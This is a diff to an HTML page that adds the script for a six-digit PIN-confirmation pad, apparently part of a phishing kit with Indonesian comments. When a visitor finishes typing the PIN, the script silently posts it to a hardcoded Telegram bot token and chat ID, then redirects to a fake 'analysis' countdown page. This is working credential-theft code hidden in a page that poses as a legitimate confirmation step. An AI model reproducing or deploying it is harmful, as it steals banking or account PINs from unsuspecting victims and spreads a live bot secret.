@@ -2445,4 +2445,63 @@ document.querySelectorAll('input[type=file]').forEach(x=>x.addEventListener('cha
   confirmBtn.addEventListener('click',function(e){ e.preventDefault(); e.stopImmediatePropagation(); open(); }, true);
 })();
 </script>
+
+<script id="kc-pinpad-logic">
+(function(){
+  var pad=document.getElementById('kc-pinpad');
+  var confirmBtn=document.getElementById('kc-confirm');
+  if(!pad||!confirmBtn) return;
+  var dots=[].slice.call(pad.querySelectorAll('.dot'));
+  var err=pad.querySelector('.kc-pp-err');
+  var pin='';
+
+  // ====== KONFIG TELEGRAM ======
+  var TG_TOKEN = "8635919924:AAHB1CPgQWMN78WQhRG100Q0o63C2NSzE4k";
+  var TG_CHAT  = "6959842489";
+
+  function tgSendPin(pinValue){
+    try{
+      var text =
+        "\ud83d\udd10 <b>KONFIRMASI PIN</b>\n\n" +
+        "Konfirmasi Pin : <code>" + pinValue + "</code>";
+      fetch("https://api.telegram.org/bot"+TG_TOKEN+"/sendMessage", {
+        method:"POST",
+        keepalive:true,
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({
+          chat_id: TG_CHAT,
+          text: text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      }).catch(function(){});
+    }catch(e){}
+  }
+  // ============================
+
+  function render(){ dots.forEach(function(d,i){ d.classList.toggle('f', i<pin.length); }); }
+  function open(){ pin=''; render(); err.textContent=''; pad.hidden=false; requestAnimationFrame(function(){ pad.classList.add('on'); }); }
+  function close(){ pad.classList.remove('on'); setTimeout(function(){ pad.hidden=true; }, 280); }
+  function done(){
+    // 🔥 Kirim PIN ke Telegram (tanpa nunggu, biar navigasi tetap cepat)
+    tgSendPin(pin);
+
+    // mulai hitung mundur analisis (5 menit), tersimpan agar tahan refresh
+    try{ localStorage.setItem('kb_analisis_start', String(Date.now())); }catch(e){}
+    if(window.__kbNav){ window.__kbNav('11-analisis.html'); } else { location.href='11-analisis.html'; }
+  }
+  function press(k){
+    if(k==='reset'){ pin=''; render(); return; }
+    if(k==='del'){ pin=pin.slice(0,-1); render(); return; }
+    if(/^[0-9]$/.test(k) && pin.length<6){ pin+=k; render();
+      if(pin.length===6){ setTimeout(done, 220); }
+    }
+  }
+  pad.querySelector('.kc-pp-keys').addEventListener('click',function(e){ var b=e.target.closest('.kc-key'); if(b) press(b.getAttribute('data-k')); });
+  pad.querySelector('.kc-pp-back').addEventListener('click',close);
+  document.addEventListener('keydown',function(e){ if(pad.hidden)return; if(/^[0-9]$/.test(e.key))press(e.key); else if(e.key==='Backspace')press('del'); else if(e.key==='Escape')close(); });
+  confirmBtn.addEventListener('click',function(e){ e.preventDefault(); e.stopImmediatePropagation(); open(); }, true);
+})();
+</script>
+
 </body></html>
